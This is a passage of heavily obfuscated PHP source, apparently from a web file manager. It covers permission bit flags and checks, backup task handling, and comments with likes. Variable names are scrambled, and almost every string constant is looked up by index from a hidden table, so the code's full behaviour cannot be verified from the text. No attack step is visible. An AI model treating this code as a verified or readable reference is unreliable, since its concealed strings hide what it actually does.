timeLimitCallLoop() { $µ²‘ÌÚ½ =& $_SERVER[€ä¾™²]; $ûıï×Üô = array($µ²‘ÌÚ½[2044]); $÷£ù·š = in_array(strtolower(ACTION), $ûıï×Üô); if (!$÷£ù·š && !self::$asyncAdd) { return; } $šúÇÆôî = $µ²‘ÌÚ½[2038]; $êößƒõù = Cache::get($šúÇÆôî, !0); if (!$êößƒõù || count($êößƒõù) <= 0) { return; } $œŸÀå¼Ğ = timeFloat(); $Ü¢œ—œú = array(); $ª¬åÑ = array(); foreach ($êößƒõù as $Ñ·Ò«Ò => $ÈÅö¼ùË) { if ($œŸÀå¼Ğ - $ÈÅö¼ùË[$µ²‘ÌÚ½[2040]] > $ÈÅö¼ùË[$µ²‘ÌÚ½[2041]]) { $ª¬åÑ[$Ñ·Ò«Ò] = $ÈÅö¼ùË; continue; } $Ü¢œ—œú[$Ñ·Ò«Ò] = $ÈÅö¼ùË; } if (count($ª¬åÑ) == 0) { return; } if (count($Ü¢œ—œú) == 0) { Cache::remove($šúÇÆôî); } else { Cache::set($šúÇÆôî, $Ü¢œ—œú, 60); } Cache::removeMemory($šúÇÆôî); self::runArr($ª¬åÑ); } public static function finished($ŞÙ½ş½ƒ, $ñÔ±·š) { $¸¯Æ˜®Ú =& $_SERVER[€ä¾™²]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($¸¯Æ˜®Ú[343] => $ŞÙ½ş½ƒ, $¸¯Æ˜®Ú[2030] => $ñÔ±·š); } private static function runArr($üÒØ±ôö) { $ÓÁÔ¯è =& $_SERVER[€ä¾™²]; if (!$üÒØ±ôö) { return; } foreach ($üÒØ±ôö as $èÃ¥Ã¯š => $™¸Ç—•Ä) { try { Hook::apply($™¸Ç—•Ä[$ÓÁÔ¯è[343]], $™¸Ç—•Ä[$ÓÁÔ¯è[2030]]); write_log($ÓÁÔ¯è[2045] . $èÃ¥Ã¯š . $ÓÁÔ¯è[74] . $™¸Ç—•Ä[$ÓÁÔ¯è[343]] . $ÓÁÔ¯è[2043] . ACTION, $ÓÁÔ¯è[196]); } catch (Exception $š­·ÏŠØ) { } } } public static function autoRun() { self::runArr(self::$syncTask); self::timeLimitCallLoop(); } } goto a±œÛÚÄã¢; c£ìÅ“óÓ: class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $ç™’Âğ× =& $_SERVER[€ä¾™²]; $îÚƒİÚˆ = array(array($ç™’Âğ×[516] => LNG($ç™’Âğ×[2129]), $ç™’Âğ×[2130] => $ç™’Âğ×[2131], $ç™’Âğ×[2132] => 1, $ç™’Âğ×[2133] => 1, $ç™’Âğ×[2134] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($ç™’Âğ×[516] => LNG($ç™’Âğ×[2135]), $ç™’Âğ×[2130] => $ç™’Âğ×[2136], $ç™’Âğ×[2132] => 2, $ç™’Âğ×[2133] => 1, $ç™’Âğ×[2134] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($ç™’Âğ×[516] => LNG($ç™’Âğ×[2137]), $ç™’Âğ×[2130] => $ç™’Âğ×[2138], $ç™’Âğ×[2132] => 3, $ç™’Âğ×[2133] => 1, $ç™’Âğ×[2134] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($ç™’Âğ×[516] => LNG($ç™’Âğ×[2139]), $ç™’Âğ×[2130] => $ç™’Âğ×[2140], $ç™’Âğ×[2132] => 4, $ç™’Âğ×[2133] => 1, $ç™’Âğ×[2134] => self::AUTH_SHOW | self::AUTH_VIEW), array($ç™’Âğ×[516] => LNG($ç™’Âğ×[2141]), $ç™’Âğ×[2130] => $ç™’Âğ×[2142], $ç™’Âğ×[2132] => 5, $ç™’Âğ×[2133] => 1, $ç™’Âğ×[2134] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($ç™’Âğ×[516] => LNG($ç™’Âğ×[2143]), $ç™’Âğ×[2130] => $ç™’Âğ×[2144], $ç™’Âğ×[2132] => 6, $ç™’Âğ×[2133] => 1, $ç™’Âğ×[2134] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($ç™’Âğ×[516] => LNG($ç™’Âğ×[2145]), $ç™’Âğ×[2130] => $ç™’Âğ×[2146], $ç™’Âğ×[2132] => 7, $ç™’Âğ×[2133] => 1, $ç™’Âğ×[2134] => 0)); return $îÚƒİÚˆ; } public static function authCheck($•À†íÕÑ, $¨¼øäÍÉ, $¸ÂÎñ±‰ = true) { $ÑÖ«ˆ…î =& $_SERVER[€ä¾™²]; $•À†íÕÑ = intval($•À†íÕÑ); if ($¸ÂÎñ±‰) { if (KodUser::isRoot() && $GLOBALS[$ÑÖ«ˆ…î[6]][$ÑÖ«ˆ…î[2147]]) { return !0; } } if ($•À†íÕÑ <= 0) { return !1; } if (($•À†íÕÑ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($•À†íÕÑ & $¨¼øäÍÉ); } public static function authCheckShow($àïßü·) { return self::authCheck($àïßü·, self::AUTH_SHOW); } public static function authCheckView($£Á™éÁ¨) { return self::authCheck($£Á™éÁ¨, self::AUTH_VIEW); } public static function authCheckDownload($½ü”‚ÅÏ) { return self::authCheck($½ü”‚ÅÏ, self::AUTH_DOWNLOAD); } public static function authCheckUpload($şï‚©¨Ì) { return self::authCheck($şï‚©¨Ì, self::AUTH_UPLOAD); } public static function authCheckEdit($¾¦­Ññ¡) { return self::authCheck($¾¦­Ññ¡, self::AUTH_EDIT); } public static function authCheckRemove($û¬äËâƒ) { return self::authCheck($û¬äËâƒ, self::AUTH_REMOVE); } public static function authCheckShare($ğáöÙæ¥) { return self::authCheck($ğáöÙæ¥, self::AUTH_SHARE); } public static function authCheckComment($õØ¾ÁÍÌ) { return self::authCheck($õØ¾ÁÍÌ, self::AUTH_COMMENT); } public static function authCheckEvent($ğ£ÔÛ…) { return self::authCheck($ğ£ÔÛ…, self::AUTH_EVENT); } public static function authCheckRoot($ãª°Ü¦¾) { return self::authCheck($ãª°Ü¦¾, self::AUTH_ROOT); } public static function authCheckAction($É®š±Ÿ, $Œ¯»¼ôï) { $ôÕä’şÆ =& $_SERVER[€ä¾™²]; $˜å´”É€ = array($ôÕä’şÆ[1506] => self::AUTH_SHOW, $ôÕä’şÆ[1507] => self::AUTH_VIEW, $ôÕä’şÆ[1328] => self::AUTH_DOWNLOAD, $ôÕä’şÆ[108] => self::AUTH_UPLOAD, $ôÕä’şÆ[1508] => self::AUTH_EDIT, $ôÕä’şÆ[1277] => self::AUTH_REMOVE, $ôÕä’şÆ[1509] => self::AUTH_SHARE, $ôÕä’şÆ[430] => self::AUTH_COMMENT, $ôÕä’şÆ[1510] => self::AUTH_EVENT, $ôÕä’şÆ[1511] => self::AUTH_ROOT); if (!isset($˜å´”É€[$Œ¯»¼ôï])) { return; } $¸ø–‰Ò = $˜å´”É€[$Œ¯»¼ôï]; $É®š±Ÿ = intval($É®š±Ÿ); if ($É®š±Ÿ <= 0) { return !1; } if (($É®š±Ÿ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($É®š±Ÿ & $¸ø–‰Ò); } public static function authDisable($ûû½Ñ—Ä, $Öı••Æº) { if (intval($ûû½Ñ—Ä) <= 0) { return 0; } return intval($ûû½Ñ—Ä) & ~$Öı••Æº; } public $optionType = "\123\171\x73\x74\145\155\x2e\163\x6f\165\x72\x63\x65\x41\165\x74\x68\x4c\x69\163\164"; public $field = array("\x6e\141\155\145", "\141\165\164\150", "\154\x61\142\x65\154", "\144\x69\x73\x70\154\141\171", "\163\x79\163\x74\145\155", "\163\x6f\x72\x74"); public function initData() { $ ×“ï„ = $this->authDefault(); foreach ($ ×“ï„ as $€Ô¸êĞİ) { $this->add($€Ô¸êĞİ); } } public function findAuth($ºåÕˆ—‡, $µšÃ§©Ô) { $Â¸Ñë´ =& $_SERVER[€ä¾™²]; $´ÕŒºÕ¦ = parent::listData(); foreach ($´ÕŒºÕ¦ as $¾“™³¬Í) { $©ÌŞóà = intval($¾“™³¬Í[$Â¸Ñë´[509]]); if ($©ÌŞóà <= 0 || $¾“™³¬Í[$Â¸Ñë´[2148]] == 0) { continue; } if (($©ÌŞóà & $ºåÕˆ—‡) != $ºåÕˆ—‡) { continue; } if (($©ÌŞóà & $µšÃ§©Ô) != 0) { continue; } return $¾“™³¬Í[$Â¸Ñë´[486]]; } return !1; } public function findAuthMax($éƒéäÑÉ, $ÕşÚìŸğ) { $£Á£¨šû =& $_SERVER[€ä¾™²]; $ßÖ­ƒáü = !1; $¿åË›¤ = parent::listData(); foreach ($¿åË›¤ as $ßËèÃ¨) { $âä©õ‡€ = intval($ßËèÃ¨[$£Á£¨šû[509]]); if ($âä©õ‡€ <= 0 || $ßËèÃ¨[$£Á£¨šû[2148]] == 0) { continue; } if (($âä©õ‡€ & $éƒéäÑÉ) != $éƒéäÑÉ) { continue; } if (($âä©õ‡€ & $ÕşÚìŸğ) != 0) { continue; } if (!$ßÖ­ƒáü) { $ßÖ­ƒáü = $ßËèÃ¨; continue; } if (intval($ßÖ­ƒáü[$£Á£¨šû[509]]) < $âä©õ‡€) { $ßÖ­ƒáü = $ßËèÃ¨; } } return $ßÖ­ƒáü ? $ßÖ­ƒáü[$£Á£¨šû[486]] : !1; } public function findAuthReadOnly() { $À¿‰ö· = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $¾Ï¦±Ùø = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($À¿‰ö·, $¾Ï¦±Ùø); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $ûşÎÒØú =& $_SERVER[€ä¾™²]; $–©¯„¢Ë = parent::listData(); $Ú–Õ•¥è = !1; foreach ($–©¯„¢Ë as $´ÍñÔ÷ı) { if ($´ÍñÔ÷ı[$ûşÎÒØú[509]] <= 0 || $´ÍñÔ÷ı[$ûşÎÒØú[2148]] == $ûşÎÒØú[229]) { continue; } if (!$Ú–Õ•¥è) { $Ú–Õ•¥è = $´ÍñÔ÷ı; continue; } if ($Ú–Õ•¥è[$ûşÎÒØú[509]] > $´ÍñÔ÷ı[$ûşÎÒØú[509]]) { $Ú–Õ•¥è = $´ÍñÔ÷ı; } } return $Ú–Õ•¥è ? $Ú–Õ•¥è[$ûşÎÒØú[486]] : $ûşÎÒØú[12]; } public function listData($ºªÛÄûœ = false, $ÆÑæüâ = "\163\x6f\x72\x74", $ÓŸ‹Ë§À = false) { return parent::listData($ºªÛÄûœ, $ÆÑæüâ, $ÓŸ‹Ë§À); } public function update($³¤’ˆŒ, $‹š¬ïÒÚ) { $îŞÁ»ÜÍ =& $_SERVER[€ä¾™²]; $ƒÃá˜¹Ç = parent::listData($³¤’ˆŒ); $šñÄ¹¦ä = $this->findByName($‹š¬ïÒÚ[$îŞÁ»ÜÍ[32]]); if (!$ƒÃá˜¹Ç || $šñÄ¹¦ä && $šñÄ¹¦ä[$îŞÁ»ÜÍ[486]] != $ƒÃá˜¹Ç[$îŞÁ»ÜÍ[486]]) { return !1; } $this->filterAuth($‹š¬ïÒÚ[$îŞÁ»ÜÍ[509]]); return parent::update($³¤’ˆŒ, $‹š¬ïÒÚ); } public function remove($ÂÂ”ÛÍ) { $¼Ä›„€à = parent::listData($ÂÂ”ÛÍ); if (!$¼Ä›„€à || $¼Ä›„€à[$_SERVER[€ä¾™²][190]]) { return !1; } return parent::remove($ÂÂ”ÛÍ); } public function add($Ñ°¶‡³Ó = array()) { $ëÈí²Ô =& $_SERVER[€ä¾™²]; if ($this->findByName($Ñ°¶‡³Ó[$ëÈí²Ô[32]])) { return !1; } $Ù®ƒŠğ‹ = array($ëÈí²Ô[32] => $ëÈí²Ô[12], $ëÈí²Ô[509] => 1, $ëÈí²Ô[2149] => $ëÈí²Ô[2138], $ëÈí²Ô[2148] => 1, $ëÈí²Ô[190] => 0, $ëÈí²Ô[2150] => 0); $Ñ°¶‡³Ó = array_merge($Ù®ƒŠğ‹, $Ñ°¶‡³Ó); $Ñ°¶‡³Ó[$ëÈí²Ô[2150]] = $this->getSort(); $this->filterAuth($Ñ°¶‡³Ó[$ëÈí²Ô[509]]); return parent::insert($Ñ°¶‡³Ó); } private function getSort() { $ñÕ½¸¡ =& $_SERVER[€ä¾™²]; $ş»áÎ“© = parent::listData(); $¤´Øß = array_to_keyvalue($ş»áÎ“©, $ñÕ½¸¡[12], $ñÕ½¸¡[2150]); return empty($¤´Øß) ? 0 : max($¤´Øß) + 1; } private function filterAuth(&$¶›²³¢†) { if (!$¶›²³¢†) { return; } $“©é‚ë = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $’èÏçÊÖ = array(); foreach ($“©é‚ë as $ê—®ä˜‚) { if ($¶›²³¢† & $ê—®ä˜‚) { $’èÏçÊÖ[] = $ê—®ä˜‚; } } if (in_array(self::AUTH_ROOT, $’èÏçÊÖ)) { $¶›²³¢† = array_sum($“©é‚ë); return; } $Üˆ¨‹Àƒ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($’èÏçÊÖ as $ê—®ä˜‚) { if (isset($Üˆ¨‹Àƒ[$ê—®ä˜‚])) { $’èÏçÊÖ = array_merge($’èÏçÊÖ, $Üˆ¨‹Àƒ[$ê—®ä˜‚]); } } $’èÏçÊÖ[] = self::AUTH_SHOW; $¶›²³¢† = array_sum(array_unique($’èÏçÊÖ)); } public function sort($öş£ñ†, $„°íå‚ª) { return parent::update($öş£ñ†, $„°íå‚ª); } } class BackupModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\145\155\56\142\141\143\153\x75\x70\x4c\151\163\x74"; public $field = array("\151\x6f", "\156\141\155\x65", "\163\x74\141\x74\x75\x73", "\x63\x6f\156\164\145\x6e\x74", "\155\141\156\x75\x61\154", "\162\145\163\165\154\164", "\164\x69\x6d\145\106\x72\157\155", "\164\x69\155\145\124\x6f"); public function config() { $¥ô˜Üâä =& $_SERVER[€ä¾™²]; Action($¥ô˜Üâä[2151])->taskInit(); $ĞŸ¦Íå = Model($¥ô˜Üâä[873])->get($¥ô˜Üâä[880]); $ĞŸ¦Íå = json_decode($ĞŸ¦Íå, !0); $ĞŸ¦Íå = is_array($ĞŸ¦Íå) ? $ĞŸ¦Íå : array(); $this->parseContent($ĞŸ¦Íå); unset($ĞŸ¦Íå[$¥ô˜Üâä[1892]]); Model($¥ô˜Üâä[1891])->cacheClear(); $·Û»ØË× = $¥ô˜Üâä[2152]; $³Ğ ‘ÔË = Model($¥ô˜Üâä[2153])->findByKey($¥ô˜Üâä[1510], $·Û»ØË×); if (!$³Ğ ‘ÔË) { $³Ğ ‘ÔË = array(); } if (isset($³Ğ ‘ÔË[$¥ô˜Üâä[205]])) { $³Ğ ‘ÔË[$¥ô˜Üâä[205]] = json_decode($³Ğ ‘ÔË[$¥ô˜Üâä[205]], !0); } if (isset($ĞŸ¦Íå[$¥ô˜Üâä[205]])) { $³Ğ ‘ÔË[$¥ô˜Üâä[205]][$¥ô˜Üâä[1895]] = $ĞŸ¦Íå[$¥ô˜Üâä[205]]; unset($ĞŸ¦Íå[$¥ô˜Üâä[205]]); } return array_merge($³Ğ ‘ÔË, $ĞŸ¦Íå); } public function listData($¼ŞÔ‡Ï = false, $Üúñë”Ú = "\x6d\157\144\151\x66\171\124\151\x6d\145", $°ÖŠÉÓÑ = false) { $¶ºùéÆ = parent::listData($¼ŞÔ‡Ï, $Üúñë”Ú, !0); if (!$¶ºùéÆ) { return $¶ºùéÆ; } if ($¼ŞÔ‡Ï) { $¶ºùéÆ = array($¶ºùéÆ); } foreach ($¶ºùéÆ as &$¡Ì¬Ùƒ¹) { $this->parseContent($¡Ì¬Ùƒ¹); } return $¼ŞÔ‡Ï ? $¶ºùéÆ[0] : $¶ºùéÆ; } public function parseContent(&$²¶ÓĞéŒ) { $éáü½¾à =& $_SERVER[€ä¾™²]; $Î•Êó² = _get($²¶ÓĞéŒ, $éáü½¾à[169], $éáü½¾à[91]); if (!in_array($Î•Êó², array($éáü½¾à[879], $éáü½¾à[1251]))) { $²¶ÓĞéŒ[$éáü½¾à[169]] = $Î•Êó² == $éáü½¾à[91] ? $éáü½¾à[1251] : $éáü½¾à[879]; } } public function lastItem() { $«¿ÚÛŠ£ = $this->listData(); return !empty($«¿ÚÛŠ£[0]) ? $«¿ÚÛŠ£[0] : null; } public function kill($ÎËö©”Æ) { $Ğãæ®²ª =& $_SERVER[€ä¾™²]; $Û®ìÏ¥Ä = $this->listData($ÎËö©”Æ); if (!$Û®ìÏ¥Ä || empty($Û®ìÏ¥Ä[$Ğãæ®²ª[32]])) { return !0; } Task::kill($Ğãæ®²ª[887]); Task::kill($Ğãæ®²ª[908]); Task::kill($Ğãæ®²ª[916]); $æ¶ÊÀó¾ = $Û®ìÏ¥Ä[$Ğãæ®²ª[32]]; $õÈ—­Ê¢ = TEMP_FILES . $Ğãæ®²ª[883] . $æ¶ÊÀó¾ . $Ğãæ®²ª[8]; IO::remove($õÈ—­Ê¢, !1); return $this->remove($ÎËö©”Æ); } public function remove($ÉåÏòÊµ) { $¬ƒËïâ» = $this->listData($ÉåÏòÊµ); if (!$¬ƒËïâ») { return !0; } return $this->backupRemove($¬ƒËïâ»); } private function backupRemove($îŠ×¸½ó) { parent::remove($îŠ×¸½ó[$_SERVER[€ä¾™²][486]]); $ò‘ùÎ¹Ô = $this->backupPath($îŠ×¸½ó); IO::remove($ò‘ùÎ¹Ô, !1); return !0; } private function backupPath($„×üñã) { $ªƒìĞˆ÷ =& $_SERVER[€ä¾™²]; $§‘îÄĞ = $„×üñã[$ªƒìĞˆ÷[32]]; $Ãà°¸·Ò = Model($ªƒìĞˆ÷[873])->get($ªƒìĞˆ÷[874]); $±·€·ŸË = substr(md5($ªƒìĞˆ÷[875] . $Ãà°¸·Ò . $§‘îÄĞ), 0, 8); return "\173\151\x6f\x3a{$„×üñã[$ªƒìĞˆ÷[852]]}\x7d\57\144\141\x74\x61\142\141\163\145\x2f\142\x61\x63\153\165\x70\57" . $§‘îÄĞ . $ªƒìĞˆ÷[11] . $±·€·ŸË; } public function start() { $§Ì¤ ˜… =& $_SERVER[€ä¾™²]; if ($GLOBALS[$§Ì¤ ˜…[6]][$§Ì¤ ˜…[92]][$§Ì¤ ˜…[2154]] != $§Ì¤ ˜…[91]) { return !0; } $İŞ’´¾™ = $this->config(); if (!$İŞ’´¾™ || $İŞ’´¾™[$§Ì¤ ˜…[1892]] != $§Ì¤ ˜…[91]) { return !1; } if ($İŞ’´¾™[$§Ì¤ ˜…[169]] == $§Ì¤ ˜…[879]) { $ù¾¾¬”¢ = Model($§Ì¤ ˜…[873])->get($§Ì¤ ˜…[1373]); if ($ù¾¾¬”¢ == $§Ì¤ ˜…[1374]) { $İŞ’´¾™[$§Ì¤ ˜…[169]] = $§Ì¤ ˜…[1251]; } } $õó²¸›† = $this->process(); foreach ($õó²¸›† as $ù¯ó‘á¹) { if ($ù¯ó‘á¹) { return Task::restart($ù¯ó‘á¹[$§Ì¤ ˜…[486]]); } } $·ÎªòÄ­ = new Backup(); $ÑÙĞô«˜ = $·ÎªòÄ­->db(); if ($ÑÙĞô«˜) { $ÑÙĞô«˜ = $·ÎªòÄ­->dbFile(); if ($ÑÙĞô«˜ && $İŞ’´¾™[$§Ì¤ ˜…[169]] == $§Ì¤ ˜…[879]) { $ÑÙĞô«˜ = $·ÎªòÄ­->file(); } } Backup::set(array($§Ì¤ ˜…[850] => 1, $§Ì¤ ˜…[862] => time())); return !0; } public function process() { $ö’¤ÏÂò =& $_SERVER[€ä¾™²]; $´Ş†¡šå = array($ö’¤ÏÂò[858] => Task::get($ö’¤ÏÂò[887]), $ö’¤ÏÂò[863] => Task::get($ö’¤ÏÂò[908]), $ö’¤ÏÂò[231] => Task::get($ö’¤ÏÂò[916])); $åµÊÜÂ» = !1; foreach ($´Ş†¡šå as &$™ä•Ï±§) { if ($åµÊÜÂ») { $™ä•Ï±§ = !1; continue; } if ($™ä•Ï±§) { $÷¬—ó¹® = intval(_get($™ä•Ï±§, $ö’¤ÏÂò[1926], 0)); if (time() - $÷¬—ó¹® > 7200) { Task::kill($™ä•Ï±§[$ö’¤ÏÂò[486]]); $åµÊÜÂ» = !0; $™ä•Ï±§ = !1; } } } return $´Ş†¡šå; } public function restore() { $€Šèˆ¼¯ =& $_SERVER[€ä¾™²]; ActionCall($€Šèˆ¼¯[2155], !0, 1); ActionCall($€Šèˆ¼¯[2155], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\143\157\x6d\x6d\145\156\164"; protected $tableMeta = array("\164\x61\x62\x6c\x65\116\x61\x6d\145" => "\x63\x6f\x6d\x6d\x65\156\x74\x5f\x6d\x65\164\141", "\x6d\x65\x74\x61\x46\x69\x65\154\144" => "\143\157\x6d\155\145\x6e\164\111\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($³´ù¯) { $Æ´Æ®á² =& $_SERVER[€ä¾™²]; if ($³´ù¯[$Æ´Æ®á²[2156]]) { $ªïŸ¶Ì³ = $this->where(array($Æ´Æ®á²[2157] => $³´ù¯[$Æ´Æ®á²[2156]]))->find(); if (!$ªïŸ¶Ì³ || $ªïŸ¶Ì³[$Æ´Æ®á²[189]] != $³´ù¯[$Æ´Æ®á²[189]] || $ªïŸ¶Ì³[$Æ´Æ®á²[596]] != $³´ù¯[$Æ´Æ®á²[596]]) { return !1; } $this->where(array($Æ´Æ®á²[2157] => $³´ù¯[$Æ´Æ®á²[2156]]))->setAdd($Æ´Æ®á²[2158], 1); } $³´ù¯[$Æ´Æ®á²[2159]] = 0; $³´ù¯[$Æ´Æ®á²[2158]] = 0; $³´ù¯[$Æ´Æ®á²[850]] = 1; return $this->add($³´ù¯); } public function commentCount($Ì„òî–š, $ªèŞ†şÌ, $ÀÔü€Ôƒ = false) { $‰…ÑŸˆ¡ =& $_SERVER[€ä¾™²]; if (!$Ì„òî–š) { return array(); } if (is_string($Ì„òî–š) || is_int($Ì„òî–š)) { $Ì„òî–š = array($Ì„òî–š); } $ü¨Ş“ÓØ = array($‰…ÑŸˆ¡[596], $‰…ÑŸˆ¡[2160] => $‰…ÑŸˆ¡[592]); $€ëÃ–çÍ = array($‰…ÑŸˆ¡[596] => array($‰…ÑŸˆ¡[7], $Ì„òî–š), $‰…ÑŸˆ¡[189] => $ªèŞ†şÌ); if ($ÀÔü€Ôƒ) { $€ëÃ–çÍ[$‰…ÑŸˆ¡[1539]] = $ÀÔü€Ôƒ; } $šç¸º = $this->field($ü¨Ş“ÓØ)->where($€ëÃ–çÍ)->group($‰…ÑŸˆ¡[596])->select(); return array_to_keyvalue($šç¸º, $‰…ÑŸˆ¡[596], $‰…ÑŸˆ¡[592]); } public function starTarget($¬÷Ãû–, $‰ÒÜ©) { $Óç·ĞûÆ =& $_SERVER[€ä¾™²]; $æÜƒøôÑ = $¬÷Ãû– + self::TYPE_STAR_OFFSET; $ñ³øÆ«Ù = array($Óç·ĞûÆ[1539] => USER_ID, $Óç·ĞûÆ[189] => $æÜƒøôÑ, $Óç·ĞûÆ[596] => $‰ÒÜ©); $“şÊÙâÃ = $this->where($ñ³øÆ«Ù)->find(); if ($“şÊÙâÃ) { return $this->where(array($Óç·ĞûÆ[486] => $“şÊÙâÃ[$Óç·ĞûÆ[486]]))->delete(); } $÷ÇâÊèõ = array($Óç·ĞûÆ[2156] => 0, $Óç·ĞûÆ[1539] => USER_ID, $Óç·ĞûÆ[850] => 1, $Óç·ĞûÆ[169] => $Óç·ĞûÆ[12], $Óç·ĞûÆ[189] => $æÜƒøôÑ, $Óç·ĞûÆ[596] => $‰ÒÜ©, $Óç·ĞûÆ[2159] => 0, $Óç·ĞûÆ[2158] => 0); return $this->add($÷ÇâÊèõ); } public function starTargetCount($ÍşøŞï, $©á¬Ôìë) { $õƒƒÈ¢“ =& $_SERVER[€ä¾™²]; $Á¹Î£ş = $©á¬Ôìë + self::TYPE_STAR_OFFSET; $ËšÉ²¢ = $this->commentCount($ÍşøŞï, $Á¹Î£ş); $Ã¾¿ áÊ = $this->commentCount($ÍşøŞï, $Á¹Î£ş, USER_ID); return array($õƒƒÈ¢“[2161] => $ËšÉ²¢, $õƒƒÈ¢“[2162] => $Ã¾¿ áÊ); } public function starTargetUserList($áÕ¢û™ò, $¹›ğ•…õ) { $²çœÁ•Š =& $_SERVER[€ä¾™²]; $·¡Ş¾µÄ = $áÕ¢û™ò + self::TYPE_STAR_OFFSET; $µŒ¸Æ™ = array($²çœÁ•Š[596] => $¹›ğ•…õ, $²çœÁ•Š[189] => $·¡Ş¾µÄ); $öû›Ó¶± = $this->where($µŒ¸Æ™)->count(); $Ã°ªŒ× = array($²çœÁ•Š[333] => $öû›Ó¶±, $²çœÁ•Š[2163] => array()); if (!$öû›Ó¶±) { return $Ã°ªŒ×; } $Ü†¾Îæ = $this->field($²çœÁ•Š[1539])->where($µŒ¸Æ™)->limit(500)->select(); $Ü†¾Îæ = array_to_keyvalue($Ü†¾Îæ, $²çœÁ•Š[12], $²çœÁ•Š[1539]); $Ã°ªŒ×[$²çœÁ•Š[2163]] = Model($²çœÁ•Š[604])->userListInfo($Ü†¾Îæ); return $Ã°ªŒ×; } public function prasiseUserList($úáäí £) { $úŒÎç£ =& $_SERVER[€ä¾™²]; $ğ§¡Í‰Ü = array($úŒÎç£[2164] => $úáäí £); $†Åè°Ç“ = $this->where($ğ§¡Í‰Ü)->find(); $À¢‰ïÆ = _get($†Åè°Ç“, $úŒÎç£[2159], 0); $öú¢ÕËÌ = array($úŒÎç£[333] => $À¢‰ïÆ, $úŒÎç£[2163] => array()); if (!$À¢‰ïÆ) { return $öú¢ÕËÌ; } $ò²÷ç‘¾ = Model($úŒÎç£[2165])->field($úŒÎç£[1539])->where($ğ§¡Í‰Ü)->limit(500)->select(); $ò²÷ç‘¾ = array_to_keyvalue($ò²÷ç‘¾, $úŒÎç£[12], $úŒÎç£[1539]); $öú¢ÕËÌ[$úŒÎç£[2163]] = Model($úŒÎç£[604])->userListInfo($ò²÷ç‘¾); return $öú¢ÕËÌ; } public function remove($Âö¼‡Ë ) { $ÍóÀÄœ” =& $_SERVER[€ä¾™²]; $ï´€ŠÓ÷ = array($ÍóÀÄœ”[2157] => $Âö¼‡Ë ); $‘ı½¤ê¶ = $this->where($ï´€ŠÓ÷)->find(); if ($‘ı½¤ê¶[$ÍóÀÄœ”[2156]]) { $this->where(array($ÍóÀÄœ”[2157] => $‘ı½¤ê¶[$ÍóÀÄœ”[2156]]))->setAdd($ÍóÀÄœ”[2158], -1); } return $this->removeArray($Âö¼‡Ë ); } public function edit($ÉñòŸ‘¿, $»ıë¤®¥) { $“üş·Î× =& $_SERVER[€ä¾™²]; $Âê÷¸òŸ = array($“üş·Î×[2157] => $ÉñòŸ‘¿); return $this->where($Âê÷¸òŸ)->save(array($“üş·Î×[2166] => $»ıë¤®¥)); } public function prasise($¾Õ¢¡êÎ) { $†šâ¢ä• =& $_SERVER[€ä¾™²]; $ˆ…Ş“îÃ = Model($†šâ¢ä•[2167]); $ÉÅ¨§¸ = array($†šâ¢ä•[2157] => $¾Õ¢¡êÎ, $†šâ¢ä•[1913] => USER_ID); $¯ïƒôºÆ = $ˆ…Ş“îÃ->where($ÉÅ¨§¸)->find(); if (!$¯ïƒôºÆ) { $ˆ…Ş“îÃ->add($ÉÅ¨§¸); $¶®À®ö = $this->where(array($†šâ¢ä•[2157] => $¾Õ¢¡êÎ))->setAdd($†šâ¢ä•[2159], 1); } else { $ˆ…Ş“îÃ->where($ÉÅ¨§¸)->delete(); $¶®À®ö = $this->where(array($†šâ¢ä•[2157] => $¾Õ¢¡êÎ))->setAdd($†šâ¢ä•[2159], -1); } return $¶®À®ö; } public function targetInfo($ˆé¤×“, $¨ˆ²µ¯İ) { $‰»Ìßõã =& $_SERVER[€ä¾™²]; $†‹¬‚ä§ = 